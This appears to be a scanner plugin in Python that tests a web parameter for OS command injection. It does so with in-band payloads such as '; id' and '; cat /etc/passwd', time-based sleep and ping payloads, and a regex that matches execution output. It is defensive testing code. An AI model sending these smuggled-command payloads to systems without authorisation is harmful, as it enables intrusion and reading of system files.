"""cmdi — OS command injection (time-based + error-marker detection)."""
import re
from common import Finding

NAME = "cmdi"

# Match command OUTPUT (proof of execution), never the command we injected —
# otherwise an app that echoes the payload back produces a false positive.
ERROR_MARKERS = re.compile(
    r"(/bin/(sh|bash):|sh: \d+:|command not found|is not recognized as an internal"
    r"|CreateProcess|root:.*:0:0:|uid=\d+\(|gid=\d+\()", re.IGNORECASE)


def _send(client, method, param, val):
    if method == "GET":
        return client.request("GET", params={param: val})
    return client.request("POST", data={param: val})


def run(client, opts):
    param = opts.get("param")
    if not param:
        return [Finding(NAME, "info", "Command-injection check skipped",
                        "no --param provided")]
    method = opts.get("method", "GET").upper()
    base = str(opts.get("base_value", "1"))
    n = int(opts.get("sleep", 5))
    out = []

    baseline = _send(client, method, param, base)

    # Error / echo-marker based (e.g. injecting `; id` or `; cat /etc/passwd`)
    for p in [base + "; id", base + "| id", base + "`id`", base + "; cat /etc/passwd"]:
        r = _send(client, method, param, p)
        m = ERROR_MARKERS.search(r.body)
        # Guard: ignore if the marker is merely the reflected payload text.
        if m and m.group(0) not in p and not ERROR_MARKERS.search(baseline.body):
            fnd = Finding(NAME, "critical", "OS command injection (in-band)",
                          f"payload {p!r} produced command output", m.group(0))
            fnd.payload = p
            fnd.proof = f"command output leaked: {m.group(0)}"
            out.append(fnd)
            return out

    # Time-based blind (chained sleep across shells)
    for p in [f"{base}; sleep {n}", f"{base}| sleep {n}", f"{base}&& sleep {n}",
              f"{base}`sleep {n}`", f"{base}$(sleep {n})",
              f"{base}& ping -n {n} 127.0.0.1"]:  # last = Windows
        r = _send(client, method, param, p)
        if r.elapsed >= n * 0.8 and r.elapsed > baseline.elapsed + n * 0.6:
            fnd = Finding(NAME, "critical", "Blind OS command injection (time-based)",
                          f"payload delayed response to {r.elapsed:.1f}s "
                          f"(baseline {baseline.elapsed:.1f}s)", p)
            fnd.payload = p
            out.append(fnd)
            break
    return out
